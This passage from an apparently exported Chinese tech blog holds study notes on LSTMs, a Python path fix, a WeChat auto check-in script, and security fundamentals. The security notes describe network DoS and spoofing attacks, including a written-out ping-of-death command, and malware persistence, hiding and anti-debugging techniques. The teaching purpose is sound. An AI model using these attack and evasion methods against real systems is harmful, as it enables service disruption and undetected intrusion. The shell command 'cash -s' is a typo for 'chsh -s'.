<li>这就是普通 RNN 没有办法回忆起久远记忆的原因。</li>
</ul>
</li>
</ul>
<h3 id="03-LSTM"><a href="#03-LSTM" class="headerlink" title="03-LSTM"></a>03-LSTM</h3><ul>
<li><p>LSTM便是为解决”健忘”问题而诞生的；</p>
</li>
<li><p>LSTM 和普通 RNN 相比, 多出了三个控制器(输入控制, 输出控制, 忘记控制)，LSTM RNN 内部情况如下：</p>
<ul>
<li>多了一个控制全局的记忆, 我们用粗线代替；</li>
<li>把粗线想象成游戏中的主线剧情，而原本 RNN 体系就是分线剧情；</li>
<li>三个控制器都是在原始的RNN 体系上；</li>
<li>先看输入控制，若此时分线剧情对于剧终结果十分重要, 输入控制就会将这个分线剧情按重要程度写入主线剧情进行分析；</li>
<li>再看忘记控制，若此时分线剧情更改了我们对之前剧情的想法, 那么忘记控制就会将之前的某些主线剧情忘记, 按比例替换成现在的新剧情；</li>
<li>所以主线剧情的更新就取决于输入和忘记控制；</li>
<li>最后看输出控制，输出控制会基于目前的主线剧情和分线剧情判断要输出的到底是什么。</li>
</ul>
</li>
<li>基于这些控制机制, LSTM 就像延缓记忆衰退的良药, 可以带来更好的结果。</li>
</ul>
]]></content>
      <categories>
        <category>其它</category>
      </categories>
      <tags>
        <tag>神经网络</tag>
      </tags>
  </entry>
  <entry>
    <title>python ModuleNotFoundError解决及思考</title>
    <url>/2019/04/05/etc/python%20ModuleNotFoundError%E8%A7%A3%E5%86%B3%E5%8F%8A%E6%80%9D%E8%80%83/</url>
    <content><![CDATA[<h2 id="01-相关知识点"><a href="#01-相关知识点" class="headerlink" title="01-相关知识点"></a>01-相关知识点</h2><ul>
<li>当你导入一个模块，Python解析器对模块位置的搜索顺序是：<ul>
<li>当前目录</li>
<li>如果不在当前目录，Python则搜索在shell变量PYTHONPATH下的每个目录。</li>
<li>如果都找不到，Python会察看默认路径。UNIX下，默认路径一般为/usr/local/lib/python/</li>
<li>模块搜索路径存储在system模块的sys.path变量中。变量里包含当前目录，PYTHONPATH和由安装过程决定的默认目录。<a id="more"></a></li>
</ul>
</li>
<li>查看当前shell：<code>echo $SHELL</code></li>
<li>更改shell：<code>cash -s /bin/zsh</code></li>
<li>不同shell有不同的配置文件<ul>
<li>bash对应~/.bash_profile</li>
<li>zsh对应~/.zshrc</li>
</ul>
</li>
<li>PYTHONPATH在shell的配置文件中定义，如<code>export PYTHONPATH=&quot;xxx/yyy&quot;</code></li>
<li><code>.zshrc</code>修改后要重启系统后生效，若要立即生效<code>source ~/.zshrc</code></li>
<li><code>pip3 show pandas</code>，查看其详细信息，可得其所在目录</li>
</ul>
<h2 id="02-实操"><a href="#02-实操" class="headerlink" title="02-实操"></a>02-实操</h2><ol>
<li><p><code>pip3 show pandas</code>得<code>Location: /usr/local/lib/python3.7/site-packages</code></p>
</li>
<li><p><code>echo $SHELL</code>得当前shell为<code>/bin/zsh</code></p>
</li>
<li><p><code>vim ~/.zshrc</code>（原先并不存在，可由bash_profile复制而来）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span> py相关环境变量，import时会用到</span><br><span class="line">export PYTHONPATH="/usr/local/lib/python3.7/site-packages"</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>source ~/.zshrc</code>使配置生效</p>
</li>
<li><p>经测试，问题解决。</p>
</li>
</ol>
]]></content>
      <categories>
        <category>其它</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>T00ls自动签到</title>
    <url>/2019/02/01/etc/T00ls%E8%87%AA%E5%8A%A8%E7%AD%BE%E5%88%B0/</url>
    <content><![CDATA[<h1 id="01-sign-py"><a href="#01-sign-py" class="headerlink" title="01-sign.py"></a>01-sign.py</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> itchat</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">from</span> apscheduler.schedulers.blocking <span class="keyword">import</span> BlockingScheduler</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sign</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># itchat.send(msg='3',toUserName='filehelper')		# 仅此可直接使用</span></span><br><span class="line">    user = itchat.search_mps(name=<span class="string">u'T00ls'</span>)		<span class="comment"># 根据昵称搜索，得到用户信息</span></span><br><span class="line">    username = user[<span class="number">0</span>][<span class="string">"UserName"</span>]		<span class="comment"># 进一步得用户ID</span></span><br><span class="line">    num = itchat.send(msg=<span class="string">'3'</span>,toUserName=username)</span><br><span class="line"></span><br><span class="line">itchat.auto_login(enableCmdQR=<span class="number">1</span>,hotReload=<span class="keyword">True</span>)		<span class="comment"># 登录</span></span><br><span class="line"></span><br><span class="line">scheduler = BlockingScheduler()</span><br><span class="line">scheduler.add_job(sign, <span class="string">'cron'</span>, day=<span class="string">'*'</span>)		<span class="comment"># cron类型，每天</span></span><br><span class="line">scheduler.start()</span><br></pre></td></tr></table></figure>
<h1 id="02-后台运行"><a href="#02-后台运行" class="headerlink" title="02-后台运行"></a>02-后台运行</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 sign.py &amp;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>其它</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>信息安全之网络协议安全</title>
    <url>/2019/01/18/base/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E4%B9%8B%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%AE%89%E5%85%A8/</url>
    <content><![CDATA[<h1 id="1-1-网络协议"><a href="#1-1-网络协议" class="headerlink" title="1.1-网络协议"></a>1.1-网络协议</h1><ul>
<li>开放系统互联，ISO/OSI，七层</li>
<li>OSI安全架构：基于八类安全机制，提供五类安全服务</li>
</ul>
<h2 id="物理层"><a href="#物理层" class="headerlink" title="物理层"></a>物理层</h2><ul>
<li>电气、机械、规程特性；</li>
<li>比特流转换为电压</li>
<li>双绞线、同轴电缆、光纤<a id="more"></a></li>
<li>中继器、集线器</li>
<li>100BaseT等标准</li>
</ul>
<h2 id="数据链路层"><a href="#数据链路层" class="headerlink" title="数据链路层"></a>数据链路层</h2><ul>
<li>物理寻址（MAC地址），网络拓扑</li>
<li>差错控制，检错和纠错</li>
<li>封装成帧</li>
<li>流量控制（滑动窗口</li>
<li>网卡、网桥、交换机</li>
<li>PPP、HDLC、ARP等协议</li>
<li>以太网协议标准，分两个子层<ul>
<li>LLC：逻辑链路控制子层<ul>
<li>IEEE 802.2 </li>
<li>为上层提供统一接口</li>
<li>使上层独立于下层的物理介质</li>
<li>提供流量控制、排序等服务</li>
</ul>
</li>
<li>MAC：媒体访问控制子层<ul>
<li>IEEE 802.3</li>
<li>烧录到网卡ROM</li>
<li>48b的MAC地址</li>
<li>唯一性</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h2><ul>
<li>逻辑寻址（IP地址）、路由选择、分组交换</li>
<li>三层交换机、路由器</li>
</ul>
<h2 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h2><ul>
<li>端到端、建立逻辑连接</li>
<li>寻址基于端口号</li>
<li>UDP、TCP</li>
</ul>
<h2 id="会话层"><a href="#会话层" class="headerlink" title="会话层"></a>会话层</h2><ul>
<li>不同应用程序的数据隔离</li>
<li>会话建立、维持、终止</li>
<li>同步服务</li>
<li>会话控制（单向或双向</li>
</ul>
<h2 id="表示层"><a href="#表示层" class="headerlink" title="表示层"></a>表示层</h2><ul>
<li>数据格式、协议、字符转换</li>
<li>数据加解密、解压缩</li>
<li>ASCII、GIF、JPEG等格式</li>
</ul>
<h2 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h2><ul>
<li>应用的接口，面向用户</li>
<li>网络访问流处理</li>
<li>流量控制</li>
<li>错误恢复</li>
<li>FTP、HTTP等协议</li>
</ul>
<h2 id="分层结构的优点"><a href="#分层结构的优点" class="headerlink" title="分层结构的优点"></a>分层结构的优点</h2><ul>
<li>降低复杂性（大问题切割成小问题，分散至各层</li>
<li>促进标准化工作</li>
<li>各层之间相互独立，一层的变化不会影响其他层</li>
<li>协议开发模块化</li>
<li>简化理解与学习</li>
</ul>
<h2 id="数据的封装与分用"><a href="#数据的封装与分用" class="headerlink" title="数据的封装与分用"></a>数据的封装与分用</h2><ul>
<li>数据封装：数据发送时，从高到低，依次封装</li>
<li>数据解封装：数据接收时，从低到高，依次解封装</li>
</ul>
<h2 id="TCP-IP与OSI的对应"><a href="#TCP-IP与OSI的对应" class="headerlink" title="TCP/IP与OSI的对应"></a>TCP/IP与OSI的对应</h2><ul>
<li>应用层：会话层、表示层、应用层</li>
<li>传输层：传输层</li>
<li>网际互联层：网络层</li>
<li>网络借口层：物理层、数据链路层</li>
</ul>
<h1 id="1-2-网络接口层安全"><a href="#1-2-网络接口层安全" class="headerlink" title="1.2-网络接口层安全"></a>1.2-网络接口层安全</h1><h2 id="网络接口层"><a href="#网络接口层" class="headerlink" title="网络接口层"></a>网络接口层</h2><ul>
<li>主要协议：ARP、RARP</li>
<li>安全问题<ul>
<li>损坏：自然灾害、动物破坏、老化、误操作</li>
<li>干扰：大功率电器、电源线路、电磁辐射</li>
<li>电磁泄漏：传输线路电磁泄漏</li>
<li>欺骗：ARP欺骗</li>
<li>嗅探：常见二层协议是明文通信的（以太、ARP等</li>
<li>拒绝服务：mac flooding、arp flooding</li>
</ul>
</li>
</ul>
<h2 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h2><ul>
<li>ARP相关：IP地址到mac地址、arp请求-广播、arp响应-单播、各主机存在映射表</li>
<li>缺陷：对arp响应没有身份认证，即攻击者也可响应，这样在请求者的映射表中就记录了错误的记录，在以后的发送中，就发到了攻击者那，从而达到欺骗的目的</li>
<li>欺骗大概过程：<ul>
<li>a:1.1.1.1、b:2.2.2.2、c:3.3.3.3</li>
<li>a发arp请求，谁的IP是2.2.2.2？即问2.2.2.2的MAC地址是什么？</li>
<li>b和c都能收到</li>
<li>正常情况，与其符合的才响应，即应该b响应</li>
<li>但c出于欺骗目的，c对a响应，说我的IP是2.2.2.2，即2.2.2.2对应的Mac是b</li>
<li>同时b对a说，1.1.1.1的mac是d</li>
<li>a找不到d，即不能与a正常通信（低级攻击，使ab不能通信</li>
<li>若c告诉a：b的mac为c、告诉b：a的mac为c</li>
<li>c就成为二者中间人，中间人攻击（高级攻击）</li>
</ul>
</li>
</ul>
<h2 id="ARP欺骗防御"><a href="#ARP欺骗防御" class="headerlink" title="ARP欺骗防御"></a>ARP欺骗防御</h2><ul>
<li>使用静态ARP缓存</li>
<li>IP与MAC地址绑定</li>
<li>ARP防御工具</li>
</ul>
<p>注：PC端防御做的较好，而手机端薄弱，故少连公共Wi-Fi，信息很容易被中间人窃取</p>
<h1 id="1-3-网络互联层安全"><a href="#1-3-网络互联层安全" class="headerlink" title="1.3-网络互联层安全"></a>1.3-网络互联层安全</h1><h2 id="网络互联层"><a href="#网络互联层" class="headerlink" title="网络互联层"></a>网络互联层</h2><ul>
<li>主要协议：IP、ICMP、IGMP</li>
<li>IP是TCP/IP协议族中最核心的协议</li>
<li>IP协议特点：不可靠、无连接（传输层实现可靠传输</li>
<li>安全问题：<ul>
<li>拒绝服务：分片攻击teardrop、死亡之ping</li>
<li>欺骗：IP源地址欺骗</li>
<li>窃听：嗅探</li>
<li>伪造：IP数据包伪造</li>
</ul>
</li>
</ul>
<h2 id="ping-of-death"><a href="#ping-of-death" class="headerlink" title="ping of death"></a>ping of death</h2><ul>
<li>ping-测试另一台主机是否可达</li>
<li>查看网络上主机是否处于活动状态</li>
<li>ping原理：发送ICMP回显请求报文给目的主机，并等待ICMP回显应答，根据回显应答的内容来判断目的主机的状况</li>
<li>ping之所以会造成伤害是因为：早期操作系统在处理ICMP协议数据包时存在漏洞，如下：</li>
<li>ICMP协议的报文长度时固定的，大小为64KB，早期很多操作系统在接收ICMP数据报文的时候，只会开辟64KB的缓存区用于存放接收到的数据包</li>
<li>一旦发送过来的ICMP数据包的实际尺寸超过64KB（65535B），操作系统将收到的数据报文向缓存区填写时，报文长度大于64KB，就会产生一个缓存溢出，结果将导致TCP/IP协议堆栈的崩溃，造成主机的重启动或死机</li>
<li>ping程序有一个“-l”参数可指定发送数据包的大小，故很容易实现此攻击，如：ping -l 65536 1.1.1.1</li>
<li>若对方主机存在这样一个漏洞，就会形成一次拒绝服务攻击，成为死亡之ping</li>
<li>如今操作系统都已做了修补，对可发送的数据包大小进行了限制，如攻击时，会显示：Bad value for option -l，valid range is from 0 to 65500</li>
</ul>
<h2 id="泪滴（Teardrop）"><a href="#泪滴（Teardrop）" class="headerlink" title="泪滴（Teardrop）"></a>泪滴（Teardrop）</h2><ul>
<li>泪滴也成为分片攻击，利用TCP/IP协议的问题，拒绝服务攻击，由于第一个实现此攻击的程序为teardrop，故也称泪滴</li>
<li>数据包过大时，要发送端要进行分片，然后在接收端进行重组</li>
<li>正常分片：0-9、9-13、13-19</li>
<li>错误分片：0-9、6-13、13-19，第一、二个分片会有重叠，在接收端重组时会崩溃，故导致错误发生</li>
</ul>
<h2 id="Smurf攻击"><a href="#Smurf攻击" class="headerlink" title="Smurf攻击"></a>Smurf攻击</h2><ul>
<li>利用IP欺骗和ICMP回应包引起目标主机网络拥塞，实现Dos攻击</li>
<li>攻击原理：<ul>
<li>在构造数据包时将源地址设置为被攻击主机的地址</li>
<li>而将目的地址设为广播地址</li>
<li>故，大量的ICMP echo 回应包被发送给被攻击主机，使其因网络拥塞而无法提供服务</li>
<li>比ping of death洪水的流量高出1或2个数量级</li>
</ul>
</li>
</ul>
<h1 id="1-4-传输层安全"><a href="#1-4-传输层安全" class="headerlink" title="1.4-传输层安全"></a>1.4-传输层安全</h1><h2 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h2><ul>
<li>传输控制协议，面向连接，可靠的，字节流服务</li>
<li>提供可靠性服务：确认、超时重传、流量控制等</li>
</ul>
<h2 id="UDP"><a href="#UDP" class="headerlink" title="UDP"></a>UDP</h2><ul>
<li>用户数据包协议，面向事务，不可靠</li>
<li>特点：无连接、不可靠、协议简单、占用资源少、效率高</li>
</ul>
<h2 id="端口号"><a href="#端口号" class="headerlink" title="端口号"></a>端口号</h2><ul>
<li>TCP/UDP通过16bit来识别应用程序</li>
<li>知名端口号由internet号分配机构来管理</li>
<li>现状<ul>
<li>1-255：知名的网络服务</li>
<li>256-1024：unix操作系统特定的端口号</li>
<li>1024-5000：临时分配的端口号</li>
<li>5000以上：保留给应用程序</li>
</ul>
</li>
</ul>
<h2 id="TCP建立连接-三次握手"><a href="#TCP建立连接-三次握手" class="headerlink" title="TCP建立连接-三次握手"></a>TCP建立连接-三次握手</h2><ul>
<li>SYN——SYN、ACK——ACK</li>
</ul>
<h2 id="传输层安全"><a href="#传输层安全" class="headerlink" title="传输层安全"></a>传输层安全</h2><ul>
<li>拒绝服务：syn flood/udp flood、smurf</li>
<li>欺骗：TCP会话劫持</li>
<li>窃听：嗅探</li>
<li>伪造：数据包伪造</li>
</ul>
<h2 id="SYN洪水攻击"><a href="#SYN洪水攻击" class="headerlink" title="SYN洪水攻击"></a>SYN洪水攻击</h2><ul>
<li>原理：三次握手只进行到前两次，客户端syn，服务端syn、ack，但客户端迟迟不发ack，服务端就一直处于等待状态</li>
<li>被攻击者主机一直处于等待状态，耗费大量资源，其再也收不到正常网络包，只有dos包</li>
<li>syn flood攻击包的源地址都是伪造的，追查工作难</li>
<li>被攻击主机积累了大量的syn半连接，可用netstat查看：netstat -an | grep SYN</li>
<li>SYN洪水攻击比较难以防御，如下几种解决办法<ul>
<li>缩短SYN timeout时间（等待时间太长就不等了</li>
<li>设置SYN cookie</li>
<li>负反馈策略</li>
<li>退让策略</li>
<li>分布式DNS负载均衡</li>
<li>防火墙</li>
</ul>
</li>
</ul>
<h2 id="UDP-flood"><a href="#UDP-flood" class="headerlink" title="UDP flood"></a>UDP flood</h2><ul>
<li>大量UDP小包冲击应用服务器（DNS、radius认证等</li>
<li>利用系统服务形成流量（echo chargen</li>
<li>利用正常UDP服务发送大流量形成网络拥塞</li>
<li>UDP洪水主要是利用主机能自动进行回复的服务（例如使用udp协议的chargen服务和echo服务）来进行攻击</li>
<li>很多提供www和mail等服务的，一般是unix服务器，其默认打开一些被黑客恶意利用的UDP服务；如echo服务会显示接收到的每一个数据包，而原本作为测试功能的chargen服务会在收到每一个数据包时随机反馈一些字符</li>
</ul>
<h2 id="LAND攻击"><a href="#LAND攻击" class="headerlink" title="LAND攻击"></a>LAND攻击</h2><ul>
<li>运用IP Spoofing技术送出一连串SYN数据包给目标主机，让目标主机误以为这些数据包是由自己发送的</li>
<li>由于目标主机在处理这些数据包的时候，他自己并无法回应给自己SYN-ACK数据包，因而造成系统宕机</li>
<li>即构造一个数据包，目的地址和源地址均是被攻击者，其自己无法给自己回应，故……</li>
<li>Land是因特网上最常见的拒绝服务攻击类型，由rootshell发现</li>
<li>原理：向目标即发送大量的源地址和目的地址相同的包，造成目标机解析Land包时占用大量的系统资源，从而使其瘫痪</li>
</ul>
<h1 id="1-5-应用层安全"><a href="#1-5-应用层安全" class="headerlink" title="1.5-应用层安全"></a>1.5-应用层安全</h1><h2 id="应用层协议"><a href="#应用层协议" class="headerlink" title="应用层协议"></a>应用层协议</h2><ul>
<li>定义了，运行在不同端系统上的，应用程序，如何相互传递报文</li>
<li>常见：域名解析-DNS、电子邮件-SMTP和POP3、文件传输-FTP、网页浏览-HTTP</li>
</ul>
<h2 id="安全问题-明文"><a href="#安全问题-明文" class="headerlink" title="安全问题-明文"></a>安全问题-明文</h2><ul>
<li>截获流量，得到明文传输的敏感信息</li>
</ul>
<h2 id="DNS欺骗"><a href="#DNS欺骗" class="headerlink" title="DNS欺骗"></a>DNS欺骗</h2><ul>
<li>正常DNS查询：递归、迭代</li>
<li>欺骗：<ul>
<li>用户a查询test网站的IP</li>
<li>向dns1查询</li>
<li>dns1不知道，继续向dns2查询</li>
<li>dns2知道，返回结果1.1.1.1</li>
<li>攻击者修改为2.2.2.2</li>
<li>故dns1得到为2.2，故用户a得到也为2.2</li>
<li>多个用户向dns1查询，故其可以影响多个用户</li>
</ul>
</li>
</ul>
<h2 id="安全问题"><a href="#安全问题" class="headerlink" title="安全问题"></a>安全问题</h2><ul>
<li>拒绝服务：超长URL链接</li>
<li>欺骗：跨站脚本、钓鱼式攻击、cookie欺骗</li>
<li>窃听：数据泄露</li>
<li>伪造：应用数据篡改</li>
<li>暴力破解：应用认证口令暴力破解</li>
</ul>
]]></content>
      <categories>
        <category>信息安全基础</category>
      </categories>
      <tags>
        <tag>信息安全</tag>
        <tag>网络协议安全</tag>
      </tags>
  </entry>
  <entry>
    <title>信息安全之恶意代码</title>
    <url>/2019/01/17/base/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E4%B9%8B%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/</url>
    <content><![CDATA[<h2 id="恶意代码发展史"><a href="#恶意代码发展史" class="headerlink" title="恶意代码发展史"></a>恶意代码发展史</h2><ul>
<li>冯诺伊曼提出概念、磁芯大战、莫里斯父子、莫里斯病毒、熊猫烧香、工业病毒、蠕虫、木马……</li>
</ul>
<h2 id="发展趋势"><a href="#发展趋势" class="headerlink" title="发展趋势"></a>发展趋势</h2><ul>
<li>传播速度：爆发、传播速度越来越快</li>
<li>攻击意图：游戏、炫耀到恶意牟利</li>
<li>功能：分工越来越细</li>
<li>实现技术：不断变化</li>
<li>传播范围：呈现多平台传播的特征<a id="more"></a></li>
</ul>
<h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><ul>
<li>运行平台</li>
<li>传播方式<ul>
<li>移动存储<ul>
<li>自动播放功能：Windows默认自动执行autorun.inf指定的文件</li>
<li>设置：组策略编辑器</li>
</ul>
</li>
<li>文件传播<ul>
<li>文件感染</li>
<li>软件捆绑：强制安装和默认安装</li>
</ul>
</li>
<li>网络传播：<ul>
<li>网页（木马伪装为页面元素、利用脚本运行的漏洞、伪装为缺失的组件、通过脚本运行调用某些com组件）、</li>
<li>邮件（社会工程学、邮件客户端漏洞、</li>
<li>即时通讯、共享</li>
</ul>
</li>
<li>主动放置<ul>
<li>利用系统提供的上传渠道FTP、论坛</li>
<li>攻击者已获得系统控制权</li>
<li>攻击者是系统开发者</li>
</ul>
</li>
<li>软件漏洞<ul>
<li>利用各种系统漏洞：缓冲区溢出：冲击波、震荡波</li>
<li>IIS的Unicode解码漏洞：红色代码</li>
</ul>
</li>
</ul>
</li>
<li>工作机制</li>
<li>危害</li>
</ul>
<h2 id="加载方式"><a href="#加载方式" class="headerlink" title="加载方式"></a>加载方式</h2><ul>
<li>随系统启动而加载<ul>
<li>开始菜单中的启动项</li>
<li>启动配置文件：autorun.bat、win.ini、system.ini</li>
<li>注册表启动项：<ul>
<li>优势隐蔽性强和方式多样</li>
<li>加载位置：load键值、userinit键值</li>
</ul>
</li>
<li>系统服务<ul>
<li>优势：隐蔽性强、无需用户登录、权限较高</li>
<li>加载方式：单独服务、替换系统服务程序</li>
</ul>
</li>
<li>组策略<ul>
<li>优势：类似启动项，但隐蔽性更高</li>
<li>不足：需要用户登录</li>
</ul>
</li>
</ul>
</li>
<li>随文件执行加载<ul>
<li>感染/文件捆绑</li>
<li>浏览器插件：优势隐蔽性强、清理困难</li>
<li>修改文件关联<ul>
<li>原理：正常情况下txt文本文件关联到记事本打开，病毒修改后，txt文本文件关联到病毒文件打开</li>
<li>优势：隐蔽性强，可关联任意类型文件，甚至可以关联目录</li>
</ul>
</li>
</ul>
</li>
<li>其他</li>
</ul>
<h2 id="恶意代码生存技术"><a href="#恶意代码生存技术" class="headerlink" title="恶意代码生存技术"></a>恶意代码生存技术</h2><ul>
<li>进程保护<ul>
<li>进程守护</li>
<li>超级权限</li>
</ul>
</li>
<li>检测对抗<ul>
<li>反动态调试</li>
<li>反静态调试</li>
</ul>
</li>
</ul>
<h2 id="进程守护"><a href="#进程守护" class="headerlink" title="进程守护"></a>进程守护</h2><ul>
<li>恶意代码主程序：实现恶意代码主功能</li>
<li>守护程序<ul>
<li>监视并保护主进程正常运行</li>
<li>组织主程序的退出</li>
<li>重启主程序</li>
<li>从备份中还原主程序</li>
<li>从网络中重新下载主程序</li>
</ul>
</li>
</ul>
<h2 id="进程保护-设备驱动程序"><a href="#进程保护-设备驱动程序" class="headerlink" title="进程保护-设备驱动程序"></a>进程保护-设备驱动程序</h2><ul>
<li><p>为什么是设备驱动程序？</p>
<p>恶意代码通过将自身注册成为设备驱动，从而获得较高权限，阻止反病毒软件对他的查杀并干扰反恶意代码软件的正常进行</p>
</li>
<li><p>特点</p>
<ul>
<li>非常高的权限</li>
<li>安全模式下下可工作</li>
<li>无法直接查杀</li>
</ul>
</li>
</ul>
<h2 id="检测对抗技术-反动静态调试"><a href="#检测对抗技术-反动静态调试" class="headerlink" title="检测对抗技术-反动静态调试"></a>检测对抗技术-反动静态调试</h2><ul>
<li>动态调试的发现<ul>
<li>伪断点</li>
<li>校验和，发现调试</li>
<li>检测运行环境，发现调试工具</li>
</ul>
</li>
<li><p>反动态调试的发现</p>
<ul>
<li>封锁键盘输入和屏幕显示</li>
<li>中止调试软件</li>
<li>恶意代码程序自动退出</li>
</ul>
</li>
<li><p>反静态调试的实现</p>
<ul>
<li>加壳：对恶意代码的可执行二进制程序进行压缩，使其执行流程发生变化</li>
<li>加密：随着加密密钥的变化，恶意代码会产生不同的表现形式，进一步提高了其抗静态分析的能力</li>
<li>代码混淆：通过插入伪指令、混淆程序数据和控制流等方法，防止静态分析和检测</li>
</ul>
</li>
</ul>
<h2 id="恶意代码隐藏技术"><a href="#恶意代码隐藏技术" class="headerlink" title="恶意代码隐藏技术"></a>恶意代码隐藏技术</h2><ul>
<li><p>隐藏通常包括本地隐藏和通信隐藏</p>
<ul>
<li>其中本地隐藏主要有：文件隐藏、进程隐藏、网络连接隐藏、内核模块隐藏、编译器隐藏</li>
<li>通信隐藏主要有：通信内容隐藏和传输通道隐藏</li>
</ul>
</li>
<li><p>rootlet技术</p>
<ul>
<li>本地隐藏，就是rootkit技术</li>
<li>恶意代码的隐藏或多或少都与rootkit技术相关</li>
</ul>
</li>
<li>本地隐藏技术：本地隐藏是指为了防止本地系统管理人员觉察而采取的隐藏手段，本地系统管理人员通常使用：查看进程列表、查看目录、查看内核模块、查看系统网络连接状态等管理命令来检测系统是否被植入了恶意代码</li>
<li>进程隐藏<ul>
<li>进程迷惑<ul>
<li>随机进程名：每次启动生成不一样的进程名，退出后无法查找</li>
<li>系统进程类命名<ul>
<li>windows.exe</li>
<li>system1.exe</li>
<li>Kernel.exe</li>
</ul>
</li>
<li>相似进程名：同名不同路径的进程</li>
<li>hidetool：利用其可以轻松在任务管理器中将某些进程隐藏掉</li>
</ul>
</li>
<li>DLL注入<ul>
<li>动态连接库文件</li>
<li>DLL注入技术是恶意代码将DLL文件放进某个进程的地址空间里，让他成为那个进程的一部分</li>
<li>优势<ul>
<li>无进程</li>
<li>隐蔽性强</li>
<li>消除难度大</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>网络隐藏<ul>
<li>端口复用<ul>
<li>重复利用系统网络打开的端口传送数据，这样既欺骗防火墙，又可以少开新端口</li>
<li>端口复用是在保证端口默认服务正常工作的条件下用，具有很强的欺骗性</li>
</ul>
</li>
<li>无端口：使用无端口的协议</li>
<li>反向端口：端口反向连接技术，是指恶意代码攻击的服务端（被控制端）主动连接客户端（控制端</li>
</ul>
</li>
<li>系统隐藏<ul>
<li>隐藏、系统文件：默认情况下，Windows不显示隐藏文件和系统文件，恶意代码将自身属性设置为隐藏和系统文件以实现隐藏</li>
<li>流文件隐藏：ADS交换数据流<ul>
<li>NTFS文件系统下，每个文件都可以有多个数据流</li>
<li>一个文件以流的形式附加到另一个文件载体中，流文件对explorer.exe等文件管理软件不可见，病毒可以利用此方式进行隐藏</li>
<li>NTFS数据流后门</li>
</ul>
</li>
<li>hook技术<ul>
<li>钩子体制允许应用程序截获处理Windows消息或特定事件</li>
<li>在目标窗口处理消息前处理它</li>
<li>SSDT hook：可改变操作系统的处理流程，实现隐藏进程、文件等效果，甚至可以骗过冰刃、Xuetr等内核级工具</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="查杀案例"><a href="#查杀案例" class="headerlink" title="查杀案例"></a>查杀案例</h2><p>查杀熊猫烧香</p>
]]></content>
      <categories>
        <category>信息安全基础</category>
      </categories>
      <tags>
        <tag>恶意代码</tag>
        <tag>信息安全</tag>
      </tags>
  </entry>
  <entry>
    <title>信息安全之操作系统安全</title>
    <url>/2019/01/17/base/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E4%B9%8B%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/</url>
    <content><![CDATA[<h1 id="1-1-操作系统安全概述"><a href="#1-1-操作系统安全概述" class="headerlink" title="1.1-操作系统安全概述"></a>1.1-操作系统安全概述</h1><h2 id="操作系统的功能"><a href="#操作系统的功能" class="headerlink" title="操作系统的功能"></a>操作系统的功能</h2><ul>
<li>用户与计算机硬件之间的接口</li>
<li>操作系统为用户提供了虚拟计算机，把硬件的复杂性与用户隔离</li>
<li>计算机系统的资源管理者<ul>
<li>CPU管理</li>
<li>存储管理</li>
<li>设备管理<a id="more"></a></li>
<li>文件管理</li>
<li>网络与通信管理</li>
<li>用户接口</li>
</ul>
</li>
</ul>
<h2 id="操作系统安全目标"><a href="#操作系统安全目标" class="headerlink" title="操作系统安全目标"></a>操作系统安全目标</h2><ul>
<li>标识系统中的用户，进行身份鉴别</li>
<li>依据系统安全策略对用户的操作进行访问控制，防止用户和外来入侵者对计算机资源的非法访问</li>
<li>监督系统运行的安全性</li>
<li>保证系统自身的安全和完整性</li>
</ul>
<h2 id="操作系统安全机制"><a href="#操作系统安全机制" class="headerlink" title="操作系统安全机制"></a>操作系统安全机制</h2><ul>
<li><p>标识与鉴别</p>
<ul>
<li>用户身份合法性鉴别</li>
<li>操作系统登录</li>
</ul>
</li>
<li><p>访问控制</p>
<ul>
<li>防止对资源的非法使用</li>
<li>限制访问主体对访问客体的访问权限</li>
<li>DAC、MAC、RBAC</li>
</ul>
</li>
<li><p>最小特权管理</p>
<ul>
<li>限制、分割用户和进程对系统资源的访问权限</li>
<li>必不可少的权限</li>
</ul>
</li>
<li><p>信道保护</p>
<ul>
<li>可信通路（trusted path</li>
<li>安全键（SAK</li>
</ul>
</li>
<li><p>安全审计</p>
<ul>
<li>对系统中有关安全的活动进行记录、检查以及审核</li>
<li>审计一般是一个独立的过程</li>
</ul>
</li>
<li><p>内存存取保护</p>
<ul>
<li>进程间/系统进程内存保护</li>
<li>段式保护、页式保护和段页式保护</li>
</ul>
</li>
<li><p>文件系统保护</p>
<ul>
<li>分区</li>
<li>文件共享</li>
</ul>
</li>
</ul>
<h1 id="1-2-Windows系统安全机制"><a href="#1-2-Windows系统安全机制" class="headerlink" title="1.2-Windows系统安全机制"></a>1.2-Windows系统安全机制</h1><h2 id="系统标识与鉴别-安全主体"><a href="#系统标识与鉴别-安全主体" class="headerlink" title="系统标识与鉴别-安全主体"></a>系统标识与鉴别-安全主体</h2><ul>
<li>安全主体类型<ul>
<li>用户账号<ul>
<li>本地用户</li>
<li>域用户</li>
</ul>
</li>
<li>组账号<ul>
<li>everyone组</li>
<li>network组</li>
</ul>
</li>
<li>计算机</li>
<li>服务</li>
</ul>
</li>
